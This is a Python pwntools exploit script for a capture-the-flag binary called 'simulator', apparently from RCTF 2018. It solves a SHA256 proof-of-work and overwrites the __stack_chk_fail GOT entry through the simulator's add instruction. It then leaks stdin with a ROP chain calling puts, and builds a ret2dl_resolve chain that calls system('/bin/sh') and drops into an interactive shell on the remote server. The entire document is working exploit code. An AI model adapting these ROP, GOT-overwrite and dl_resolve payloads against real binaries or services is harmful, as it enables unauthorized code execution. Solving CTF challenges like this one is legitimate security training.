from pwn import *
from ctypes import *
import os
import roputils as rop
from hashlib import sha256

remote_addr = "simulator.2018.teamrois.cn"
remote_port = 3131

local_addr = "127.0.0.1"
local_port = 1807

pc = "./simulator"
pwn_elf = ELF(pc)
pwn_rop = rop.ROP(pc)


uselibc = 1 #0 for no,1 for i386,2 for x64
local = 0
haslibc = 0
atta = 0

if uselibc == 2:
	context.arch = "amd64"
else:
	context.arch = "i386"

if uselibc ==2 and haslibc == 0:
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
else:
	if uselibc == 1 and haslibc == 0:
		libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
	else:
		libc = ELF('./libc.so.6')

if local == 1:
	if haslibc:
		p = process(pc,env={'LD_PRELOAD':'./libc.so.6'})
	else:
		p = process(pc)
elif local == 0:
	p = remote(remote_addr,remote_port)
	if haslibc:
		libc = ELF('./libc.so.6')
else:
	p = remote(local_addr,local_port)
	if haslibc:
		libc = ELF('./libc.so.6')

context.log_level = True

if local:
	if atta:
		gdb.attach(p,'b *0x0804AC51')
		#b *0x0804887F \n 
		#0x400b6a

def ru(a):
	return p.recvuntil(a)

def sn(a):
	p.send(a)

def rl():
	return p.recvline()

def sl(a):
	p.sendline(a)

def rv(a):
	return p.recv(a)

def raddr(a,l=None):
	if l == None:
		return u64(rv(a).ljust(8,'\x00'))
	else:
		return u64(rl().strip('\n').ljust(8,'\x00'))

def lg(s,addr):
	print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

def sa(a,b):
	p.sendafter(a,b)

def sla(a,b):
	p.sendlineafter(a,b)
	
def change_2_data():
	sl('.data')
def change_2_text():
	sl('.text')

# def input_data(data):
# 	payload = 'pop_ret' + ' ' + str(pop_ret)
# 	sl(payload)
# 	sl(data)

def input_code(code):
	sl(code)

def fuckingsha256():
	chal = rl().strip('\n')
	for i0 in range(0x100):
		for i1 in range(0x100):
			for i2 in range(0x100):
				for i3 in range(0x100):
					sol = chr(i0)+chr(i1)+chr(i2)+chr(i3)
					if(sha256(chal + sol).digest().startswith('\0\0\0')):
						return sol


def hack():
	raw_input()

	res = fuckingsha256()
	sl(res)
	fgets_got = pwn_elf.got['fgets']
	fgets_plt = pwn_elf.plt['fgets']
	puts_plt = pwn_elf.plt['puts']
	stack_chk_fail_got = pwn_elf.got['__stack_chk_fail']
	addr_bss = pwn_rop.section('.bss') + 0x200
	
	vul_func = 0x08048680
	stdin_addr = 0x0804D080
	leave_ret = 0x0804AC56
	register_val = 0x0804DA24
	pop_ret = 0x08048545
	ppp_ret = 0x0804b339
	
	# step 1: overwrite __stack_chk_fail's got to the address of ret
	change_2_text()
	offset = ((stack_chk_fail_got - register_val) & 0xffffffff )/8-0x20
	print hex(offset) 
	code = 'add '+str(offset)+','+str(leave_ret)+','+str(0)
	input_code(code)
	sl('END')

	# step 2: leak the value of stdin
	offset = 0x30
	payload = pwn_rop.retfill(offset)
	payload += p32(puts_plt) + p32(pop_ret) + p32(stdin_addr)
	payload += p32(vul_func)
	sla('comment: ',payload)
	stdin_addr = u32(rv(4))
	lg('stdin_addr',stdin_addr)

	# step 3: dl_resolve
	sl('END')
	payload = pwn_rop.retfill(offset)
	payload += pwn_rop.call(fgets_plt, addr_bss, 100, stdin_addr)
	payload += pwn_rop.dl_resolve_call(addr_bss + 20, addr_bss)
	sla('comment: ',payload)

	payload = pwn_rop.string('/bin/sh')
	payload += pwn_rop.fill(20, payload)
	payload += pwn_rop.dl_resolve_data(addr_bss + 20, 'system')
	payload += pwn_rop.fill(100, payload)
	sl(payload)
	#sl('C'*0x30)
	p.interactive()

hack()